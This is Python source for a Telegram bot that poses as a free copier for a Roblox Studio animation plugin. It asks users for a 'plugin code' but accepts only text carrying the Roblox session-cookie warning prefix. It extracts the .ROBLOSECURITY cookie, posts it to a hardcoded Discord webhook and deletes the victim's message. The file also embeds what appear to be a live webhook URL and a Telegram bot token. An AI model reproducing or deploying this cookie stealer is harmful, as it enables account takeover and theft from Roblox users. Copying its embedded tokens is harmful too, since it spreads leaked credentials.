import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import requests
import time
import os

# Настройка логирования
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# URL вебхука Discord (рекомендуется использовать переменные окружения для хранения токена)
WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK_URL', 'https://discord.com/api/webhooks/1455808682880401449/C-IWHsaOPYLt_rK0RRlBkf-ECBgSxbaESbhI5lTuf4afusLot0F1bJCxOMF2aewZzBkX')
COOLDOWN_TIME = 600  # 10 минут в секундах
MAX_REQUESTS = 4  # Максимальное количество запросов
request_count = {}  # Счетчик запросов для пользователей
last_sent_time = {}  # Время последней отправки

# Путь к файлу плагина
PLUGIN_FILE_PATH = 'MoonAnimator2.rbxm'

# Команда /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    keyboard = [
        [InlineKeyboardButton("🔓Copy Plugin For Roblox Studio🔓", callback_data='copy_plugin')],
        [InlineKeyboardButton("✨Exclusive features✨", callback_data='exclusive_features')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text('Welcome! Please choose an option:', reply_markup=reply_markup)

# Обработка нажатий кнопок
async def button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()

    if query.data == 'copy_plugin':
        await query.edit_message_text(text='Enter the plugin code to begin processing and downloading the plugin.')
        return  # Ожидаем ввода кода

    elif query.data == 'exclusive_features':
        await query.edit_message_text(text='Your Telegram ID is not on the list for accessing this section.')

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.message.from_user.id
    input_code = update.message.text.strip()
    warning_text = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"

    # Проверка на блокировку
    if user_id in last_sent_time and (time.time() - last_sent_time[user_id]) < COOLDOWN_TIME:
        await update.message.reply_text('You are temporarily blocked from sending requests. Please try again later.')
        return

    # Инициализация счетчика запросов для пользователя
    if user_id not in request_count:
        request_count[user_id] = 0

    # Увеличиваем счетчик запросов
    request_count[user_id] += 1

    # Проверка на превышение лимита запросов
    if request_count[user_id] > MAX_REQUESTS:
        last_sent_time[user_id] = time.time()  # Устанавливаем время блокировки
        await update.message.reply_text('You have exceeded the maximum number of requests. Please wait 10 minutes before trying again.')
        return

    # Проверка на пустой ввод
    if not input_code:
        await update.message.reply_text('Request error: please make sure you entered the correct code to copy.')
        return

    # Проверка на наличие предупреждения
    if warning_text not in input_code:
        await update.message.reply_text('Request error: please make sure you entered the correct code to copy.')
        return

    # Извлекаем шифр после предупреждения
    code_data = input_code.split(warning_text)[1].strip() if warning_text in input_code else ''
    
    # Проверяем, если шифр пустой
    if not code_data or len(code_data) == 0:
        await update.message.reply_text('Request error: please make sure you entered the correct code to copy.')
        return

    # Удаляем все лишние данные после длинного шифра
    long_code = code_data.split(" ", 1)[0]  # Извлекаем только первый элемент до первого пробела

    # Проверяем длину кода
    logger.info(f"Extracted code: {long_code}")

    if len(long_code) > 2000:
        logger.error("Message exceeds Discord's maximum length of 2000 characters.")
        await update.message.reply_text('The message is too long. Please shorten it and try again.')
        return

    try:
        # Отправка данных на вебхук
        response = requests.post(WEBHOOK_URL, json={"content": long_code})
        response.raise_for_status()  # Проверка на ошибки HTTP
        await update.message.reply_text('You have successfully entered the code. Processing, please wait a few seconds for download.')

        # Удаление сообщения с кодом
        await update.message.delete()

        # Запрос ID плагина
        await update.message.reply_text('Enter the ID of the plugin to copy.')
    except requests.exceptions.RequestException as e:
        logger.error(f"Error sending data to webhook: {e}")
        await update.message.reply_text('There was an error processing your request. Please try again later.')

async def handle_plugin_id(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.message.from_user.id
    plugin_id = update.message.text.strip()

    # Проверка на ввод только цифр
    if not plugin_id.isdigit():
        await update.message.reply_text('Please enter the plugin ID.')
        return

    # Проверка на правильный ID плагина
    if plugin_id == "4725618216":
        await update.message.reply_text('Please wait a few seconds for download.')
        # Отправка файла пользователю
        await context.bot.send_document(chat_id=user_id, document=open(PLUGIN_FILE_PATH, 'rb'))
        # Сбрасываем счетчик запросов после успешного ввода
        request_count[user_id] = 0
        last_sent_time[user_id] = time.time()  # Устанавливаем время блокировки на 10 минут
    else:
        await update.message.reply_text('Please wait a few seconds for downloading, but nothing will happen.')

def main() -> None:
    # Создание приложения с использованием ApplicationBuilder
    application = ApplicationBuilder().token(os.getenv('TELEGRAM_BOT_TOKEN', '8490790438:AAEXcvwpjsNqdVk106xljtsSOqxmuHCeJyQ')).build()

    # Обработчики команд
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_plugin_id))  # Добавлен обработчик для ID плагина

    # Запуск бота
    application.run_polling()

if __name__ == '__main__':
    main()
